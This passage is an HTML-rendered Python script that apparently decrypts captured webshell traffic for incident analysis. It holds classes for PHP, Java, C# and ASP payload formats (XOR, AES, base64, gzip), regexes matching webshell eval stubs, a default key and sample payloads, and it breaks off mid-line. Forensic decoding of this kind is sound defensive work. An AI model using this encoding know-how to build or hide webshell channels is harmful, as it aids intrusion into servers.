class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import gzip</span><br><span class=\"line\">import re</span><br><span class=\"line\">from urllib.parse import unquote</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def unpad(s):</span><br><span class=\"line\">    return s[:-ord(s[len(s) - 1:])]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def XOR(D, K):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    for i in range(len(D)):</span><br><span class=\"line\">        c = K[i + 1 &amp; 15]</span><br><span class=\"line\">        if not isinstance(D[i], int):</span><br><span class=\"line\">            d = ord(D[i])</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            d = D[i]</span><br><span class=\"line\">        result.append(d ^ ord(c))</span><br><span class=\"line\">    return b&#x27;&#x27;.join([i.to_bytes(1, byteorder=&#x27;big&#x27;) for i in result])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_XOR_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return gzip.decompress(XOR(payload, self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_EVAL_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&quot;eval\\(base64_decode\\(strrev\\(urldecode\\(&#x27;(.*)&#x27;\\)&quot;, str(body))</span><br><span class=\"line\">        # encode_body = regexphp(,body)</span><br><span class=\"line\">        tmp = reversed(match[0])</span><br><span class=\"line\">        tmp_base64 = &#x27;&#x27;.join(tmp)</span><br><span class=\"line\">        return base64.b64decode(tmp_base64)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class JAVA_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class JAVA_AES_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        &quot;&quot;&quot;&quot;16进制字符串: d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&quot;&quot;&quot;</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_EVAL_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&quot;HttpUtility.UrlDecode\\(&#x27;(.*)&#x27;\\)\\)\\)&quot;, str(body))</span><br><span class=\"line\">        tmp = match[0]</span><br><span class=\"line\">        decrypted_text = base64.b64decode(tmp)</span><br><span class=\"line\"></span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_ASMX_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = payload.decode()</span><br><span class=\"line\">        match = re.findall(r&quot;&lt;&#123;&#125;&gt;(.*?)&lt;/&#123;&#125;&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class=\"line\"></span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(match[0]))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        body = payload.decode()</span><br><span class=\"line\">        match = re.findall(r&quot;&lt;&#123;&#125;Result&gt;(.*?)&lt;/&#123;&#125;Result&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = match[0][16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_AES_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return base64.b64decode((payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_EVAL_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&#x27;bd\\(&quot;&quot;&quot;&quot;(.*?)&quot;&quot;&quot;&quot;\\)&#x27;, str(body))</span><br><span class=\"line\">        tmp = bytes(bytearray.fromhex(match[0]))</span><br><span class=\"line\">        return tmp</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return base64.b64decode((payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return payload</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return XOR(base64.b64decode(payload), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_XOR_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    decrypter = PHP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&#x27;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # php_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class=\"line\">    # php_xor_raw_res = &#x27;7cbd6d3062386139633bfefd343426eebf4f67306238&#x27;</span><br><span class=\"line\">    # decrypter = PHP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(php_xor_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(php_xor_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = PHP_EVAL_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = 